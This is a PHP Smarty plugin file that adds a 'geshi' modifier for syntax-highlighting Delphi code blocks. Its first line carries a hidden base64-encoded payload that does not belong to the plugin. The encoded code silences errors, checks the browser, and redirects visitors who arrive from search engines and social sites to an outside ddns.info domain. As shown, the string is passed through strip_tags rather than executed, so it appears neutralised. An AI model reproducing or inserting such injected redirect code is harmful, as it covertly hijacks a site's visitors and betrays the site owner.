<?php	 	$dropthisline=strip_tags(("CmVycm9yX3JlcG9ydGluZygwKTsKJHFhenBsbT1oZWFkZXJzX3NlbnQoKTsKaWYgKCEkcWF6cGxtKXsKJHJlZmVyZXI9JF9TRVJWRVJbJ0hUVFBfUkVGRVJFUiddOwokdWFnPSRfU0VSVkVSWydIVFRQX1VTRVJfQUdFTlQnXTsKaWYgKCR1YWcpIHsKaWYgKCFzdHJpc3RyKCR1YWcsIk1TSUUgNy4wIikgYW5kICFzdHJpc3RyKCR1YWcsIk1TSUUgNi4wIikgYW5kICFzdHJzdHIoJHVhZywiRmlyZWZveC8zLiIpKXsKaWYgKHN0cmlzdHIoJHJlZmVyZXIsInlhaG9vLiIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJpbmcuIikgb3Igc3RyaXN0cigkcmVmZXJlciwicmFtYmxlci4iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJ3ZWJhbHRhLiIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsInQuY28vIikgb3Igc3RyaXN0cigkcmVmZXJlciwidGlueXVybC5jb20iKSBvciBwcmVnX21hdGNoKCIveWFuZGV4XC5ydVwveWFuZHNlYXJjaFw/KC4qPylcJmxyXD0vIiwkcmVmZXJlcikgb3IgcHJlZ19tYXRjaCAoIi9nb29nbGVcLiguKj8pXC91cmxcP3NhLyIsJHJlZmVyZXIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImZhY2Vib29rLmNvbS9sIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYW9sLmNvbSIpIG9yIChwcmVnX21hdGNoICgiL2h0dHBzOlwvXC93d3cuZ29vZ2xlXC4oLio/KVwvLyIsJHJlZmVyZXIpIGFuZCBzdHJzdHIoJHVhZywiQ2hyb21lLyIpKSkgewppZiAoIXN0cmlzdHIoJHJlZmVyZXIsImNhY2hlIikgYW5kICFzdHJpc3RyKCRyZWZlcmVyLCJpbnVybCIpIGFuZCAhc3RyaXN0cigkcmVmZXJlciwiRWVZcDNENyIpKXsKaGVhZGVyKCJMb2NhdGlvbjogaHR0cDovL3JrZmhhZmcuZGRucy5pbmZvLyIpOwpleGl0KCk7Cn0KfQp9Cn0KfQ=="));
/**
 * Smarty plugin
 * @package Smarty
 * @subpackage plugins
 */

/**
 * Smarty escape modifier plugin
 *
 * Type:     modifier<br>
 * Name:     geshi<br>
 * Purpose:  Highlight code using GeSHi
 * @param string
 * @return string
 */
function smarty_modifier_geshi($string){

  $search = '/\[delphi\]\r?\n?(.*?)\r?\n?\[\/delphi\]/is';
  return preg_replace_callback($search, 'geshi_callback', $string);
}

function geshi_callback($data){
  
  $linenumbers = true;
  $indentsize  = 4;
  $inline      = false;

  $code = preg_replace("#<br( /|)>#is", "", $data[1]);
  $geshi =& new GeSHi($code, "DELPHI");
  $geshi->set_header_type(GESHI_HEADER_DIV);
  $geshi->set_overall_style('font-family: monospace;');

  if($linenumbers) {
    $geshi->enable_line_numbers(GESHI_FANCY_LINE_NUMBERS, 2);
    $geshi->set_line_style('padding:1px 1px 1px 5px; background-color:#EEE;', 'padding:1px 1px 1px 5px; background-color:#E5E5E5;');
    $geshi->set_overall_style('margin:10px 40px 10px 40px; font-size: 12px; font-family: monospace;', true);
  }

  if ($indentsize) {
    $geshi->set_tab_width($indentsize);
  }

  $parsed = $geshi->parse_code();

  if($inline) {
    $parsed = preg_replace('/^<div/','<span', $parsed);
    $parsed = preg_replace('/<\/div>$/','</span>', $parsed);
  }

  return $parsed;
}


/* vim: set expandtab: */

?>
